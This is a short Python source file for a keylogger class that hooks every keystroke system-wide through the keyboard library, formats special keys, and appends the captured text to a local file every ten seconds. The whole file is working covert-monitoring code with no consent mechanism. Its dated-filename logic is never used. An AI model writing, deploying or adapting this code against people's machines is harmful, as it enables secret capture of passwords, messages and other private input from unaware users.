import keyboard
from datetime import datetime
from threading import Timer


class Keyloger:
    """
    A keylogger is any component of software or hardware that can intercept and record all manipulations with a computer keyboard.
    """
    def __init__(self):
        self.interval = 10
        self.log = ""

    def callback(self, event):
        """Replacement of special keys"""
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        """
           Create a file name that will be identified by the start and end date of the recording.
           """
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report(self):

        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            self.report_to_file()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def report_to_file(self):
        """
            Create a file and write our entry into it.
            """
        with open(f"keylog.txt", "a") as f:
            print(self.log, file=f)

    def start_keyloger(self):
        """
            Launching our keylogger.
            """
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()